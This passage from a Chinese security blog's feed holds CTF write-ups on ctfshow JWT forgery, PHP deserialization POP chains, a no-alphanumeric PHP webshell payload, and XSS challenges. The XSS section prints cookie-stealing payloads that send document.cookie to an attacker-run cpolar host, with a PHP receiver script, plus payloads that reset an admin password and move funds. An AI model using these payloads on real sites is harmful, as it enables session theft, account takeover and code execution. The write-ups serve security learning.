href="https://www.bilibili.com/video/BV1vU4y187HE/?p=5&amp;spm_id_from=pageDriver&amp;vd_source=bacfffe46b930fda5761b63367eb298c">web349_哔哩哔哩_bilibili</a></p><p>看这个视频跟着做吧，我写不下去了，就是跟着这个视频做的，然后在遇到相同的题可以跟据这个模板来做，因为环境已经搭好了，只需要把题目给的源码给进行修改就行了。</p><h2 id="web350"><a href="#web350" class="headerlink" title="web350"></a>web350</h2><p>题目</p><p><img src="../images/image-20230119214505677.png" alt="image-20230119214505677"></p><p>访问/public.key获得公钥<br>jwt攻击参考文章<code>https://xz.aliyun.com/t/2338</code><br>这个题是利用的第三种<br><img src="../images/20201230165107811.png" alt="在这里插入图片描述"></p><p><img src="../images/image-20230119215019473.png" alt="image-20230119215019473"></p><p>这道题查看源码发现private.key是给放到route目录下了，那么我们就不可以去拿到private.key,然后进行生成新的cookie了，那么我们就得通过修改加密算法，用公钥来解题。</p><p><img src="../images/image-20230119215315985.png" alt="image-20230119215315985"></p><p>修改一下route里的代码，然后npm start 启动3000端口，拿到cookie，就去题目修改cookie，post发包就可以了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;JWT —-&amp;gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/86937325&quot;&gt;https://zhuanlan.zhihu.com/p/86937325&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;可以去看看这篇文章了解一下啥是JWT(如果觉得不好，可以自己</summary>
      
    
    
    
    
    <category term="ctfshow JWT 刷题记录" scheme="https://ke1nys.github.io/tags/ctfshow-JWT-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>三校联合训练赛web wp</title>
    <link href="https://ke1nys.github.io/posts/47456b21.html"/>
    <id>https://ke1nys.github.io/posts/47456b21.html</id>
    <published>2023-01-15T09:06:48.000Z</published>
    <updated>2023-01-15T13:19:25.117Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="BuyBuyBuy"><a href="#BuyBuyBuy" class="headerlink" title="BuyBuyBuy"></a><strong>BuyBuyBuy</strong></h3><p><img src="../images/image-20230115170900853.png" alt="image-20230115170900853"></p><p>打开题目  发现是买flag的题目 题目还给了源码，这不是送分吗(狗头)</p><p><img src="../images/image-20230115171139731.png" alt="image-20230115171139731"></p><p>一共两处地方，<strong>/login和/buyflag</strong>  而且通过查看源码和题目的cookie，发现是一道jwt类型的题目</p><p>然后就去了解了一下，jwt是什么，然后就知道是通过修改cookie来获得flag的。</p><p>jwt解密网站<code>https://jwt.io/</code></p><p><img src="../images/image-20230115171545935.png" alt="image-20230115171545935"></p><p>访问/login然后输入get传个usrname的参数，就可以拿到cookie值，然后拿去jwt解密网站去解密</p><p><img src="../images/image-20230115171709619.png" alt="image-20230115171709619"></p><p><strong>secret不知道</strong>    大概去找了找，没找到，就直接利用工具去破解拿到secret了。</p><p><strong>利用jwt爆破攻击爆破</strong><br>下载地址<code>https://github.com/brendan-rius/c-jwt-cracker</code>具体安装方法文档中有。<br>使用方法 ./jwtcrack jwt</p><p><img src="../images/image-20230115171846564.png" alt="image-20230115171846564"></p><p>然后拿到secret，就去jwt解密网站去修改money和secret</p><p><img src="../images/image-20230115172145729.png" alt="image-20230115172145729"></p><p>然后就去访问/buyflag去买flag。</p><p><img src="../images/image-20230115172114903.png" alt="image-20230115172114903"></p><p>然后就拿到flag了。</p><h3 id="EasyRCE"><a href="#EasyRCE" class="headerlink" title="EasyRCE"></a><strong>EasyRCE</strong></h3><p><img src="../images/image-20230115172921998.png" alt="image-20230115172921998"></p><p>一道<strong>无数字字母的rce</strong>  (大写字母其实可以不加)(狗头)</p><p>直接上网找就行了，网上有payload</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;);$___=$$__;$_($___[_]);</span><br><span class="line"></span><br><span class="line">// 密码为 &quot;_&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230115173206199.png" alt="image-20230115173206199"></p><p>拿到flag.</p><h3 id="EzPOP"><a href="#EzPOP" class="headerlink" title="EzPOP"></a><strong>EzPOP</strong></h3><p><img src="../images/image-20230115173342461.png" alt="image-20230115173342461"></p><p>一道php的反序列化pop链的构造，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">思路是这样的通过__destruct()  -&gt;  __toString()   -&gt;__get()  -&gt;   __invoke()</span><br></pre></td></tr></table></figure><p>就是这样的一条链子，他的难点在与怎么传参的问题。</p><p>这个问题也困扰了我好久</p><p>然后经过漫长长长的尝试，然后就尝试成功了，我们可以构造一个新的函数来进行传参。</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>=<span class="string">&#x27;cat /f*&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aa</span>(<span class="params"><span class="variable">$eee</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd=<span class="variable">$eee</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;This is cmd :&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bb</span>(<span class="params"><span class="variable">$eee</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$eee</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; name -&gt; obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EEE</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>();</span><br><span class="line"><span class="variable">$aa</span>=<span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">BBB</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">EEE</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">aa</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$b</span>-&gt;<span class="title function_ invoke__">bb</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="keyword">var</span>=<span class="variable">$aa</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后拿生成的链子去打就能拿到flag了。</p><h3 id="HappyNewYear"><a href="#HappyNewYear" class="headerlink" title="HappyNewYear"></a><strong>HappyNewYear</strong></h3><p><img src="../images/image-20230115174012742.png" alt="image-20230115174012742"></p><p>一道简单的关于php特性的题目</p><p>绕过第一层判断可以利用数字加字母的形式就行了，字母必须得加在数字的后面，不然会被判断为0；</p><p>第二层判断可以在本地来进行判断，因为可能传的payload错了，但不知道是哪边没过  这里可以利用<code>%0a</code>进行绕过。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?year=2023a&amp;key=happyNewYear%0a</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230115174511475.png" alt="image-20230115174511475"></p><p>剩下的java反序列化  和一道长长的反序列化题，目前水平不够，解不了了。。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h3 id=&quot;BuyBuyBuy&quot;&gt;&lt;a href=&quot;#BuyBuyBuy&quot; class=&quot;headerlink&quot; title=&quot;Buy</summary>
      
    
    
    
    
    <category term="三校联合 web wp" scheme="https://ke1nys.github.io/tags/%E4%B8%89%E6%A0%A1%E8%81%94%E5%90%88-web-wp/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-XSS-刷题记录</title>
    <link href="https://ke1nys.github.io/posts/c697f3a9.html"/>
    <id>https://ke1nys.github.io/posts/c697f3a9.html</id>
    <published>2023-01-13T12:24:16.000Z</published>
    <updated>2023-01-18T15:30:24.296Z</updated>
    
    <content type="html"><![CDATA[<p><strong>其实XSS有很多语句的的，如果做题的时候被过滤了的话，可以在这篇文章下找，这篇文章就为了用来记录xss的payload的</strong></p><p><strong>XSS漏洞常见类型 反射型：交互的数据一般不会被存在数据库里面，一次性，所见即所得，一般出现在查询类页面；(需要别人去点击自己伪造的链接)    存储型：交互的数据会被存在数据库里面，永久性存储，一般出现在留言板、注册等页面；(管理员访问的时候就会自动执行)   DOM型：不与后台服务器产生数据交互，是一种通过DOM操作前段代码输出的时候产生的问题，一次性，也属于反射型。</strong></p><h2 id="web316-反射型"><a href="#web316-反射型" class="headerlink" title="web316(反射型)"></a>web316(反射型)</h2><p>这里由于懒得花钱去搞vps(当然也没去学咋搞…)所以这里就用一个内网渗透的工具去搞(cpolar)</p><p>具体怎么用可以自己去网上去找，很简单的  <a href="https://blog.51cto.com/u_13540373/5760290">点击这里，这篇文章可以教你如何操作</a></p><p>需要部署在本地的php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$flag</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>,<span class="variable">$flag</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>作用：<strong>就是接收get传递进来的参数，并写在flag.txt里</strong></p><p>因为我这里的php代码是放在phpstudy的www目录下，到时候直接去www目录下看就好了。</p><p><img src="../images/image-20230118143203368.png" alt="image-20230118143203368"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=&#x27;http://77c9e44.r8.cpolar.top/1.php?c=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这里生成的网址的话，cpolar会自己给你随机生成的，到时候自己进行更换就好了。</p><h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><p>题目</p><p><img src="../images/image-20230118143557955.png" alt="image-20230118143557955"></p><p><strong>过滤了script</strong></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;window.location.href=&#x27;http://77c9e44.r8.cpolar.top/1.php?c=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230118143720453.png" alt="image-20230118143720453"></p><h2 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h2><p>题目</p><p><img src="../images/image-20230118143810781.png" alt="image-20230118143810781"></p><p><strong>过滤了img</strong></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;window.location.href=&#x27;http://77c9e44.r8.cpolar.top/1.php?c=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h2><p>题目</p><p><img src="../images/image-20230118144111539.png" alt="image-20230118144111539"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;window.location.href=&#x27;http://77c9e44.r8.cpolar.top/1.php?c=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="web320-326"><a href="#web320-326" class="headerlink" title="web320-326"></a>web320-326</h2><p>题目</p><p><img src="../images/image-20230118144333194.png" alt="image-20230118144333194"></p><p><strong>这都过滤了空格</strong></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=&quot;window.location.href=&#x27;http://77c9e44.r8.cpolar.top/1.php?c=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="web327-存储型"><a href="#web327-存储型" class="headerlink" title="web327(存储型)"></a>web327(存储型)</h2><p>题目</p><p><img src="../images/image-20230118150350661.png" alt="image-20230118150350661"></p><p>收件人必须填admin，其他的可以随便填</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=&quot;window.location.href=&#x27;http://77c9e44.r8.cpolar.top/1.php?c=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><p>源码</p><p><img src="../images/image-20230118150649147.png" alt="image-20230118150649147"></p><p>这个题比较绕，解法是先进行页面注册，把js代码注入后台，然后管理员访问的时候，就会触发js代码，把管理员的cookie返回到我们本地.</p><p>(这里就是利用注册的时候注册js代码，等管理员访问的时候就会触发代码，然后返回管理员的cookie)</p><p>这里的话<strong><body></strong>用不了</p><p>我们换成<script></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=&#x27;http://33d37750.r7.cpolar.top/1.php?c=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230118152652575.png" alt="image-20230118152652575"></p><p>拿到了管理员的cookie值，那么我们进行抓包查看，因为我们单纯修改cookie的话，第一个页面会默认我们不是管理员，看不了flag，所以我们要抓另一个包。</p><p><img src="../images/image-20230118212607420.png" alt="image-20230118212607420"></p><p>成功拿到flag，抓包的时候要记得放掉第一个包，得抓第二个。</p><h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>题目</p><p><img src="../images/image-20230118212824093.png" alt="image-20230118212824093"></p><p>这道题的话是管理员cookie会一直在变，那么我们就不能利用管理员cookie登录了，那么我们就得换一个方法了。</p><p><img src="../images/image-20230118220105619.png" alt="image-20230118220105619"></p><p>拿到了存贮这个类的页面</p><p><img src="../images/image-20230118220134350.png" alt="image-20230118220134350"></p><p>那么我们就可以去遍历了，(这里利用的是前端的语句，我也不太会，没学过)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JS indexof 方法https://www.w3school.com.cn/jsref/jsref_indexOf.asp</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">$(&#x27;.laytable-cell-1-0-1&#x27;).each(function(index,value)&#123;</span><br><span class="line">    if(value.innerHTML.indexOf(&#x27;ctfshow&#123;&#x27;)==0)&#123;</span><br><span class="line">        window.location.href=&#x27;http://33d37750.r7.cpolar.top/1.php?c=&#x27;+value.innerHTML; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230118220445638.png" alt="image-20230118220445638"></p><p>最后将上面的payload进行注册登录就能拿到flag了(这里是利用前端的语句来获取的)</p><h2 id="web330-GET"><a href="#web330-GET" class="headerlink" title="web330(GET)"></a>web330(GET)</h2><p>题目</p><p><img src="../images/image-20230118220652986.png" alt="image-20230118220652986"></p><p>这个多了个修改密码的功能(那肯定是拿这个修改密码来做文章了)</p><p>这里的思路是同过给管理员账户修改密码，然后通过新修改的密码登录管理员账户，然后拿到flag就ok了。</p><p>但是这里在哪触发script就很迷，经过测试，发现在用户名这里可以进行触发。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=&#x27;http://127.0.0.1/api/change.php?p=123&#x27;;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这里的127.0.0.1是管理员的账户，后面的<code>/api/change.php?p=123</code>是修改密码时的页面，可以自己去抓个包看看。(这里就是把管理员的密码给修改为123)</p><p><strong>这里查看用户管理的时候要进行抓包查看，因为这个会一闪而过，看不了。</strong></p><h2 id="web331-POST"><a href="#web331-POST" class="headerlink" title="web331(POST)"></a>web331(POST)</h2><p>题目</p><p><img src="../images/image-20230118224424779.png" alt="image-20230118224424779"></p><p>还是这样子(还是通过修改管理员的密码这个方法来进行获取flag)</p><p>但是这里改成POST提交了，我们得换一下paylaod</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&#x27;http://127.0.0.1/api/change.php&#x27;,type:&#x27;post&#x27;,data:&#123;p:&#x27;123&#x27;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="web332-GET"><a href="#web332-GET" class="headerlink" title="web332(GET)"></a>web332(GET)</h2><p>题目</p><p><img src="../images/image-20230118225058977.png" alt="image-20230118225058977"></p><p>新增加了几个功能</p><p>思路</p><p>就是利用这里面的逻辑漏洞，就是想管理员账号转账-10000,然后自己就会加钱，转正的会减钱，可以自己去尝试。</p><p>然后转账成功就去买flag就行了。</p><h2 id="web333-POST"><a href="#web333-POST" class="headerlink" title="web333(POST)"></a>web333(POST)</h2><p>题目</p><p><img src="../images/image-20230118231027106.png" alt="image-20230118231027106"></p><p>这道题的话就不能去进行转账负金额了，(同时这里也修改成了POST)</p><p><strong>解法一</strong></p><p>这里的话是通过注册一个账号，然后给自己转账，只要金额不超过自身拥有的就行，那么我们的存款就可以增加，然后就可以买到flag了。</p><p><strong>解法二</strong></p><p><img src="../images/image-20230118232026586.png" alt="image-20230118232026586"></p><p>post包的内容变了，那么我们就去修改一下payload</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&#x27;http://127.0.0.1/api/amount.php&#x27;,type:&#x27;post&#x27;,data:&#123;u:&#x27;123&#x27;,a:&#x27;10000&#x27;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>​                 <strong>u是转账的账户名  a是转账的金额</strong></p><p>思路</p><p>(这道题的解法是通过管理员给自己转账，就是先自己注册一个账户，然后修改payload，把自己的用户名和需要转的金额加进去，然后在拿去注册，然后等管理员去访问管理页面，js代码就会执行，然后就会像我们自己的账户转钱，那么我们就登录我们自己的账户就可以看到转来的钱了，然后在拿去买flag就行了)</p><p>到此，xss搞一段落了</p><p>(其实还有很多<strong>XSS</strong>的框架没用到，以后做题的时候可以出搜来用用)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;其实XSS有很多语句的的，如果做题的时候被过滤了的话，可以在这篇文章下找，这篇文章就为了用来记录xss的payload的&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;XSS漏洞常见类型 反射型：交互的数据一般不会被存在数据库里面，一次性，所见即所得，一般</summary>
      
    
    
    
    
    <category term="XSS ctfshow" scheme="https://ke1nys.github.io/tags/XSS-ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-反序列化 刷题记录</title>
    <link href="https://ke1nys.github.io/posts/fd5983bb.html"/>
    <id>https://ke1nys.github.io/posts/fd5983bb.html</id>
    <published>2023-01-03T16:58:17.000Z</published>
    <updated>2023-01-13T12:20:45.518Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><p>源码</p><p><img src="../images/image-20230104214414714.png" alt="image-20230104214414714"></p><p>这里没有魔术方法，因为魔术方法是下划线开头的  ——&gt;    __toString()  类似这种</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure><p>没用到反序列化的东西。</p><h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><p>源码</p><p><img src="../images/image-20230104215011783.png" alt="image-20230104215011783"></p><p>这里用到了反序列的语句了，但魔术方法还是没有用到。</p><p>这题和上一题的不同是false无法自动变成true了，那么我们就得手动去变。</p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>获取脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>()));</span><br></pre></td></tr></table></figure><p>这里面的话函数可以删去，这里也可以不用urlencode,用的原因是protected  private会产生不可见字符，如果用的话，就不管啥情况都可以过了。就不用担心不可见字符了。</p><h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><p>源码</p><p><img src="../images/image-20230104220444891.png" alt="image-20230104220444891"></p><p>这里的话涉及到username和password的问题，既要相等又要不等，那么我们在反序列处是可以控制类里面的参数的值的</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%222%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure><p>获取脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 